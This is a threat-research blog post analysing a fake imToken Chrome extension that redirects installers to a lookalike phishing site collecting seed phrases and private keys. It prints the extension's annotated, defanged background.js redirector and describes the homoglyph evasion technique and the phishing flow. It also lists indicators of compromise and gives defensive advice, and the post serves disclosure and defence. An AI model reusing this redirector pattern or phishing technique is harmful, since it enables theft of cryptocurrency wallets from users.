---
title: "Fake imToken Chrome Extension Steals Seed Phrases via Phishing Redirects"
short_title: "Fake imToken Extension Steals Seed Phrases"
date: 2026-03-05 12:00:00 +0000
categories: [Malware, Browser Extensions]
tags: [Chrome, Phishing, Homoglyphs, Extensions, T1195.002, T1176.001, T1059.007, T1204, T1036, T1656, T1566, T1583.001, T1583.006, T1056.003]
description: "Mixed-script homoglyphs and a lookalike domain mimic imToken's import flow to capture mnemonics and private keys."
toc: true
canonical_url: https://socket.dev/blog/fake-imtoken-chrome-extension-steals-seed-phrases-via-phishing-redirects
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/e287bd2970e97281c6ff1f4549daf475cf3470f8-1024x1024.png?w=1600&q=95&fit=max&auto=format
  alt: Fake imToken Chrome extension phishing artwork
---

Socket's Threat Research Team uncovered a malicious Chrome extension, [`lmΤoken Chromophore`](https://socket.dev/chrome/package/bbhaganppipihlhjgaaeeeefbaoihcgi/overview) (extension ID [`bbhaganppipihlhjgaaeeeefbaoihcgi`](https://chromewebstore.google.com/detail/lm%CF%84oken-chromophore/bbhaganppipihlhjgaaeeeefbaoihcgi)), that impersonates [imToken](https://token.im/) while presenting itself as a hex color visualizer in the Chrome Web Store. Instead of providing the harmless tool it promises, the extension automatically opens a threat actor-controlled phishing site as soon as it is installed, and again whenever the user clicks it.

On install, the extension fetches a destination URL from a hardcoded JSONKeeper endpoint (`jsonkeeper[.]com/b/KUWNE`) and opens a tab pointing to a lookalike Chrome Web Store-style domain, `chroomewedbstorre-detail-extension[.]com`. The landing page impersonates imToken using mixed-script homoglyphs and funnels victims into credential-capture flows that request either a 12 or 24 word seed phrase or a private key. The extension itself does not implement the advertised functionality or local wallet-theft logic, its role is to deliver victims to the phishing site where wallet recovery secrets are collected.

imToken is an established non-custodial wallet brand that started in 2016, has served more than 20 million customers, and supports users in more than 150 countries and regions, making it a high-value phishing target because stolen seed phrases and private keys can enable immediate wallet takeover. imToken [states](https://support.token.im/hc/en-us/articles/33409839387033-Beware-of-Malicious-Chrome-Extensions-and-AI-Video-Scams-Security-Monthly-Report-27th-Issue) that it is currently available only as a mobile app and has not released a Chrome extension, while its January 2026 [security notice](https://support.token.im/hc/en-us/articles/33409839387033-Beware-of-Malicious-Chrome-Extensions-and-AI-Video-Scams-Security-Monthly-Report-27th-Issue) explicitly warns that fake Chrome extensions have already led to user losses.

The extension was published on February 2, 2026, has 39 weekly active users, and remains live on the Chrome Web Store at the time of writing. It also shows 5-star ratings and links to a privacy policy that claims no data collection, which can make the listing appear legitimate while concealing its connection to threat actor-controlled phishing infrastructure. We have reported the extension and the associated publisher account registered with `liomassi19855@gmail[.]com` to Google for removal.

![](https://cdn.sanity.io/images/cgdhsj6q/production/889406b46c0f366533d2f371ae0b33accad4f782-564x490.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's verdict on [`bbhaganppipihlhjgaaeeeefbaoihcgi`](https://socket.dev/chrome/package/bbhaganppipihlhjgaaeeeefbaoihcgi/overview) reflects the extension's true role in the attack chain, a lightweight Chrome redirector that leads victims from a deceptive Chrome Web Store listing to phishing pages designed to capture wallet recovery secrets._

## This Chrome Extension Was Never About Color

The threat actor tried to make the extension look official before a victim ever inspected the code. The Chrome Web Store listing used the imToken name, paired it with wallet-themed imagery, and adopted a storefront style that closely resembled the legitimate brand's public presentation. Adding the word "Chromophore" (a light-absorbing part of a molecule that gives it color) helped disguise the listing as a plausible companion tool rather than an obvious fake, while still keeping the trusted wallet brand front and center.

The threat actor used familiar branding cues to make the malicious extension feel consistent with the real imToken product, which likely increased the chances that users would install it and follow the later phishing flow.

![](https://cdn.sanity.io/images/cgdhsj6q/production/ada14ecd61b4e0ff1545c9268fb9b37e6d7dcc4a-1176x589.png?w=1600&q=95&fit=max&auto=format)
_imToken's official site highlights a well-established wallet brand identity, which the malicious [`lmΤoken Chromophore`](https://socket.dev/chrome/package/bbhaganppipihlhjgaaeeeefbaoihcgi/overview) extension mimicked to appear affiliated._

![](https://cdn.sanity.io/images/cgdhsj6q/production/acd6195a82e36c42a3ac7e9ea450622ff8d74d1a-1476x833.png?w=1600&q=95&fit=max&auto=format)
_The malicious Chrome Web Store listing adopts imToken branding and wallet-focused imagery, masking its real role as a phishing redirector that sends users to threat actor-controlled pages instead of delivering a legitimate wallet tool._

## How the Phishing Workflow Unfolds

The attack begins as soon as the victim installs the extension. Instead of opening the advertised utility, the extension launches a new browser tab to `chroomewedbstorre-detail-extension[.]com`, a lookalike domain controlled by the threat actor. That landing page is designed to look and feel like an imToken onboarding flow, but the deception starts even before the victim interacts with it.

The page title uses mixed-script Unicode homoglyphs to imitate `imToken`. In `іmΤоken`, the apparent `i`, `T`, and `o` are not Latin letters, they are Cyrillic `і`, Greek `Τ`, and Cyrillic `о`. The mnemonic import path uses the same trick in `Sееd-Phrase`, where the two `e` characters are actually Cyrillic. It is a deliberate impersonation and filter-evasion technique that can frustrate simple text matching, URL-based detections, and casual manual review.

The extension's [`background.js`](https://socket.dev/chrome/package/bbhaganppipihlhjgaaeeeefbaoihcgi/files/4.9.5/background.js) shows its true function. Rather than providing a legitimate interface, it retrieves a destination URL from a hardcoded JSON endpoint and opens a threat actor-controlled page. The snippet below highlights that core logic with our inline comments and defanged endpoints.

```javascript
const endpoint = "https://www.jsonkeeper[.]com/b/KUWNE";
// Hardcoded remote config
// Lets the threat actor change the target off-box

async function openStoredLink() {
  const r = await fetch(endpoint);
  // Fetch remote config

  const d = await r.json();
  // Parse JSON response

  const u = typeof d === "string" ? d : d.url;
  // Accept raw URL or { url }
  // Enables easy retargeting

  chrome.tabs.create({ url: u });
  // Open the threat actor-chosen page
}

chrome.runtime.onInstalled.addListener(() => {
  setTimeout(openStoredLink, 1000);
  // Auto-run shortly after install
  // Starts the redirect without user action
});

chrome.action.onClicked.addListener(() => {
  openStoredLink();
  // Re-run the same redirect on click
  // No real utility UI is shown
});
```

`background.js` shows that the extension's real function is redirection, not utility. It pulls a destination from a hardcoded [JSONKeeper](https://socket.dev/chrome/package/bbhaganppipihlhjgaaeeeefbaoihcgi/files/4.9.5/background.js#L1) endpoint and opens it in a new tab, giving the threat actor off-box control over where victims land. Because the redirect fires automatically on install and again on click, the phishing workflow begins without any legitimate wallet or color-tool behavior ever taking place.

![](https://cdn.sanity.io/images/cgdhsj6q/production/8b56cfcdc34318b83c33f40ff6afacb446c9d35e-1699x1102.png?w=1600&q=95&fit=max&auto=format)
_The extension opens a threat actor-controlled wallet import page on a lookalike phishing domain that uses mixed-script homoglyphs to impersonate imToken._

If the victim selects the mnemonic path, the site asks for a 12 or 24 word seed phrase as though it were part of a standard wallet recovery process. The recovered seed page makes the goal explicit, prompting the user to enter wallet recovery words directly into the threat actor-controlled site. The underlying HTML also references several external JavaScript files hosted on `compute-fonts-appconnect.pages[.]dev`, including `sjcl-bip39.js`, `wordlist_english.js`, `jsbip39.js`, and `formScript.js`, along with a local `../media/bundle.js`. Based on their names and placement in the page, these scripts likely support mnemonic validation, wordlist handling, and form processing.

![](https://cdn.sanity.io/images/cgdhsj6q/production/9ad3469c69b85d7fa78a672ffc1e9eb19863faa1-1756x1278.png?w=1600&q=95&fit=max&auto=format)
_The mnemonic path asks the victim to enter a 12 or 24 word seed phrase directly into threat actor-controlled infrastructure._

The same landing page also offers a private key import path. That branch asks the victim to enter the wallet's plaintext private key, giving the threat actor a second route to the same result. Whether the victim chooses mnemonic or private key, the objective is identical: capture the secret material required for wallet takeover. The private key path is technically simpler than the mnemonic flow, but from a threat actor's perspective it is just as valuable, since a valid private key can provide immediate control over the associated assets.

![](https://cdn.sanity.io/images/cgdhsj6q/production/c49b5fdf6175b20eaa0f9fd808845fcbdeb15025-1750x1266.png?w=1600&q=95&fit=max&auto=format)
_The alternate path requests a plaintext private key, giving the threat actor another direct route to wallet access._

Once the victim submits either secret, the workflow advances to a password setup screen. This step is important because it makes the phishing sequence feel authentic. In a legitimate wallet import flow, asking the user to set a local password would be expected behavior. Here, the same prompt serves to preserve the illusion that the wallet is being imported normally, even though the critical secret has already been disclosed. It may also collect an additional credential that the victim associates with the imported wallet, further extending the value of the theft.

![](https://cdn.sanity.io/images/cgdhsj6q/production/79e8934f308794ea0138fdbafc6521c12bd4af11-1759x1309.png?w=1600&q=95&fit=max&auto=format)
_After collecting the wallet secret, the phishing flow continues with a fake password setup step to maintain legitimacy._

From there, the site moves into a closing sequence designed to reduce suspicion after the theft has already occurred. A loading screen appears, followed by a benign status message claiming the wallet is being upgraded. This creates the impression that the process is still underway and that the delay is operational rather than suspicious. By the time the victim sees this screen, the most sensitive information has already been entered into threat actor-controlled pages.

![](https://cdn.sanity.io/images/cgdhsj6q/production/c7373b349cbd97e9c2f525acdfe70659608627f4-1706x1170.png?w=1600&q=95&fit=max&auto=format)
_A status screen keeps the victim engaged after submission and makes the fake workflow appear routine._

The final step is subtle but effective. The phishing workflow opens the legitimate `token.im` site in a separate tab while the threat actor-controlled page remains open with its upgrade notice. That handoff uses the real brand as cover after the victim has already disclosed the wallet secret. Seeing the legitimate site may reassure the victim that the earlier steps were connected to a real imToken process, when in fact the threat actor-controlled flow has already served its purpose.

In practical terms, the chain is straightforward: install the fake extension, get redirected to a fake imToken import page, choose mnemonic or private key, enter the wallet secret, continue through a convincing setup flow, and then land on the legitimate site only after the threat actor has captured the data needed for wallet takeover.

![](https://cdn.sanity.io/images/cgdhsj6q/production/31331ba5d7fea3c6ff13691bf8edd987a7167742-2250x1481.png?w=1600&q=95&fit=max&auto=format)
_The final step opens the real `token.im` site as a decoy after the wallet secret has already been collected._

## Outlook and Recommendations

The extension itself is small and simple: publish a convincing Chrome Web Store listing, fetch a remote destination, redirect the victim, and collect wallet secrets on threat actor-controlled pages. Defenders should expect more browser extension lures that contain little obvious theft logic locally and instead rely on remote configuration, lookalike domains, homoglyphs, and external phishing scripts. That means teams need to inspect both the extension package and the infrastructure it opens.

Treat browser extensions like any other third-party software. Restrict installs in sensitive browser profiles, verify wallet software against the vendor's official distribution channels, and alert on extensions whose primary runtime behavior is to fetch remote content and open external destinations. Hunt for lookalike domains, homoglyph-based paths, dead-drop configuration endpoints, and externally hosted JavaScript tied to login or wallet import flows. If a user entered a seed phrase, private key, or wallet password into a phishing page, treat the wallet as compromised and rotate to new keys immediately.

[**Socket's Chrome extension protection**](https://socket.dev/blog/socket-now-protects-the-chrome-extension-ecosystem) helps identify malicious or risky extensions before deployment. The [**Socket Web Extension**](https://socket.dev/features/web-extension) adds real-time risk signals while analysts and developers browse packages and extensions. The [**Socket GitHub App**](https://socket.dev/features/github) flags risky dependencies in pull requests before merge. The [**Socket CLI**](https://socket.dev/features/cli) surfaces red flags during installs and CI. [**Socket Firewall**](https://socket.dev/blog/introducing-socket-firewall) blocks known malicious packages before the package manager fetches them. [**Socket MCP**](https://socket.dev/blog/socket-mcp) extends those checks into AI-assisted coding so malicious or hallucinated packages do not enter the codebase through LLM suggestions.

## Indicators of Compromise (IoCs)

### Malicious Chrome extension

- Extension name: [`lmΤoken Chromophore`](https://socket.dev/chrome/package/bbhaganppipihlhjgaaeeeefbaoihcgi)
- Extension ID: [`bbhaganppipihlhjgaaeeeefbaoihcgi`](https://chromewebstore.google.com/detail/lm%CF%84oken-chromophore/bbhaganppipihlhjgaaeeeefbaoihcgi)
- Version analyzed: `4.9.5`
- Store listing: `https://chromewebstore[.]google[.]com/detail/lm%CF%84oken-chromophore/bbhaganppipihlhjgaaeeeefbaoihcgi`

### Threat Actor-Controlled Configuration Endpoint

- `https://www[.]jsonkeeper[.]com/b/KUWNE`

### Threat Actor's Publisher Email

- `liomassi19855@gmail[.]com`

### Phishing Infrastructure

- Primary Redirect Page: `https://chroomewedbstorre-detail-extension[.]com/detail-bbhaganppipihlhjgaaeeeefbaoihcgi`
- Mnemonic Capture Page: `hxxps://chroomewedbstorre-detail-extension[.]com/detail-bbhaganppipihlhjgaaeeeefbaoihcgi/S%D0%B5%D0%B5d-Phrase/`
- Private Key Capture Page: `hxxps://chroomewedbstorre-detail-extension[.]com/detail-bbhaganppipihlhjgaaeeeefbaoihcgi/Private-Key/`

### External Phishing Infrastructure

- Script Host: `https://compute-fonts-appconnect[.]pages[.]dev`
- Mnemonic Handling Script: `https://compute-fonts-appconnect[.]pages[.]dev/sjcl-bip39.js`
- Wordlist Script: `https://compute-fonts-appconnect[.]pages[.]dev/wordlist_english.js`
- BIP39 Helper Script: `https://compute-fonts-appconnect[.]pages[.]dev/jsbip39.js`
- Form Processing Script: `https://compute-fonts-appconnect[.]pages[.]dev/formScript.js`

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1176.001 — Software Extensions: Browser Extensions
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1204 — User Execution
- T1036 — Masquerading
- T1656 — Impersonation
- T1566 — Phishing
- T1583.001 — Acquire Infrastructure: Domains
- T1583.006 — Acquire Infrastructure: Web Services
- T1056.003 — Input Capture: Web Portal Capture
